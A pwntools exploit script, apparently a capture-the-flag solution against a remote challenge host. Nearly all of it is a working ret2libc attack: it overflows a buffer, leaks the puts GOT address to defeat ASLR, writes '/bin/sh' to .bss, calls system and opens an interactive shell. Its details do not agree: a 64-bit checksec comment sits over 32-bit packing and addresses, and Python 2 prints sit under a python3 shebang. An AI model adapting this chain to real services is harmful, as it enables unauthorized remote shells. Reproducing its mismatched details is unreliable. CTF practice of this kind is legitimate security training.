#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host easypwn4.nu-tech.xyz --port 20001 ./pwn
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwn')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'easypwn4.nu-tech.xyz'
port = int(args.PORT or 20001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc = ELF('./libc-cos.so')
bss = exe.bss()
pop_1 = 0x08048331
pop_3 = 0x08048599
# p = 'a'*28
# p += p64(exe.sym['answr'])
# io.sendlineafter('ini?',p)

p = 'a'*28
# p += 'a'
# p += chr(i)
# p += p32(exe.plt['read'])
# p += p32(pop_3)
# p += p32(0)
# p += p32(bss)
# p += p32(8)
# p += p32(exe.sym['vuln'])

p += p32(exe.plt['puts'])
p += p32(pop_1)
# p += p32(1)
p += p32(exe.got['puts'])
# p += p32(4)
p += p32(exe.sym['answr'])

# p += p32(exe.plt['write'])
# p += p32(pop_3)
# p += p32(0)
# p += p32(bss)
# p += p32(8)
# p += p32(system)
# # p += p32(exit)
# p += p32(bss)
# p += ret2csu(exe.got['write'],1,exe.got['read'],8)
io.sendafter('ini?\n',p)

data = u32(io.recv(4))
print hex(data)
libc.address = data - libc.sym['puts']
print hex(libc.address)
sleep(0.1)

p = 'a'*28

p += p32(exe.plt['read'])
p += p32(pop_3)
p += p32(0)
p += p32(bss)
p += p32(8)
p += p32(exe.sym['answr'])
io.send(p)

sleep(0.1)

io.send('/bin/sh\x00')

sleep(0.1)

p = 'a'*28

p += p32(libc.sym['system'])
p += p32(libc.sym['exit'])
p += p32(bss)
io.send(p)

io.interactive()

